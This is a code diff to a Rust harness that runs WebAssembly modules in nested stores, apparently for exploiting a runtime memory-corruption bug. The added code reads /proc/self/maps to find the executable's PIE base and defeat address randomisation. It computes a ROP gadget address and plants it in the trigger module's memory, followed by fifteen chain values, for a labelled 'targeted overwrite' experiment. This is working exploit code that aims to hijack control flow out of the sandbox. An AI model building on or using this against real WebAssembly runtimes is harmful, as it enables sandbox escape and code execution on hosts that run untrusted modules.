@@ -452,6 +452,34 @@ fn writestream(path: &str, iters: i32, stride: u64, warm_path: Option<&str>, war
     println!("]}}");
 }
 
+// Resolve the runtime base of the current executable's first executable mapping
+// (PIE binaries: runtime address = base + ELF vaddr).
+fn find_binary_base() -> u64 {
+    let exe = match fs::read_link("/proc/self/exe") {
+        Ok(p) => p.to_string_lossy().to_string(),
+        Err(_) => return 0,
+    };
+    if let Ok(s) = fs::read_to_string("/proc/self/maps") {
+        for line in s.lines() {
+            if !line.contains(&exe) {
+                continue;
+            }
+            let fields: Vec<&str> = line.split_whitespace().collect();
+            if fields.len() < 6 || !fields[1].contains('x') {
+                continue;
+            }
+            let mut rp = fields[0].split('-');
+            let start = rp
+                .next()
+                .and_then(|a| u64::from_str_radix(a, 16).ok())
+                .unwrap_or(0);
+            let off = u64::from_str_radix(fields[2], 16).unwrap_or(0);
+            return start.saturating_sub(off);
+        }
+    }
+    0
+}
+
 // ---------------- E4: nested holder/trigger (targeted overwrite) ----------------
 
 fn nested(
@@ -461,6 +489,8 @@ fn nested(
     warm_path: Option<&str>,
     warm_threads: usize,
     tag: i32,
+    gadget_off: Option<u64>,
+    marker: u64,
 ) {
     let trigger_src = match fs::read(trigger_path) {
         Ok(b) => b,
@@ -545,6 +575,28 @@ fn nested(
     }
     NESTED_B_ITERS.store(iters as u64, Ordering::Relaxed);
 
+    // E6: plant the runtime pivot (gadget address) + chain values into the trigger's memory
+    let mut gadget_addr: u64 = 0;
+    if let Some(goff) = gadget_off {
+        let base = find_binary_base();
+        gadget_addr = base + goff;
+        if let Ok(mem) = instance_b.exports.get_memory("memory") {
+            let view = mem.view(&store_b);
+            let mut vals: Vec<u8> = Vec::with_capacity(16 * 8);
+            vals.extend_from_slice(&gadget_addr.to_le_bytes()); // slot 0 = gadget
+            for _ in 0..15 {
+                vals.extend_from_slice(&marker.to_le_bytes()); // slots 1..15 = chain value
+            }
+            match view.write(64, &vals) {
+                Ok(_) => eprintln!(
+                    "NESTED planted gadget=0x{:x} marker=0x{:x} (base=0x{:x} off=0x{:x})",
+                    gadget_addr, marker, base, goff
+                ),
+                Err(e) => eprintln!("NESTED plant failed: {:?}", e),
+            }
+        }
+    }
+
     // A = holder (suspends inside env.query while the trigger runs above it)
     let mut store_a = Store::new(engine());
     let module_a = match Module::new(&store_a, HOLDER_WAT) {
@@ -598,8 +650,8 @@ fn nested(
     eprintln!("NESTED holder returned: {}", result);
     let scans = WS_SCANS.lock().map(|v| v.len()).unwrap_or(0);
     println!(
-        "{{\"pattern\":\"{}\",\"iters\":{},\"result\":\"{}\",\"scans\":{}}}",
-        trigger_path, iters, result, scans
+        "{{\"pattern\":\"{}\",\"iters\":{},\"result\":\"{}\",\"scans\":{},\"gadget\":\"0x{:x}\",\"marker\":\"0x{:x}\"}}",
+        trigger_path, iters, result, scans, gadget_addr, marker
     );
 }
 
@@ -795,7 +847,14 @@ fn main() {
         let warm_path = args.get(5).map(|s| s.as_str());
         let warm_threads: usize = args.get(6).and_then(|s| s.parse().ok()).unwrap_or(0);
         let tag: i32 = args.get(7).and_then(|s| s.parse().ok()).unwrap_or(1);
-        nested(&args[2], iters, stride, warm_path, warm_threads, tag);
+        let gadget_off: Option<u64> = args
+            .get(8)
+            .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok());
+        let marker: u64 = args
+            .get(9)
+            .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok())
+            .unwrap_or(0x4242424242424242);
+        nested(&args[2], iters, stride, warm_path, warm_threads, tag, gadget_off, marker);
     } else {
         eprintln!(
             "usage: {} patterns | run <file.wat> | drift <file.wat> <iters> | writestream <file.wat> <iters> [stride] [warm.wat] [warm_threads] | nested <trigger.wat> <iters> [stride] [warm.wat] [warm_threads] [tag]",
